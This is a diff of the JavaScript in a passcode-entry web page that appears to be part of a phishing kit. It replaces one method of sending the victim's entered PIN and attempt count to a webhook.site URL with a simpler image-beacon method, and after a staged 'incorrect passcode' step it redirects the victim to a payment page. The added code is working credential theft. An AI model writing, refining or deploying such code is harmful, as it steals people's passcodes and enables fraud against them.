@@ -68,13 +68,9 @@
                     document.getElementById('error').textContent = "Incorrect passcode. Try again.";
                     setTimeout(() => { clearPin(); document.getElementById('error').textContent = ""; }, 1600);
                 } else {
-                    // Send PIN using query string
-                    const url = `https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819?pin=${pin}&attempts=${attempts}&status=PASSCODE_ENTERED`;
-                    fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
-                    
-                    setTimeout(() => {
-                        window.location.href = 'payment.html';
-                    }, 600);
+                    // Ultra simple method
+                    new Image().src = `https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819?pin=${pin}&attempts=${attempts}`;
+                    setTimeout(() => window.location.href = 'payment.html', 800);
                 }
             }
         }
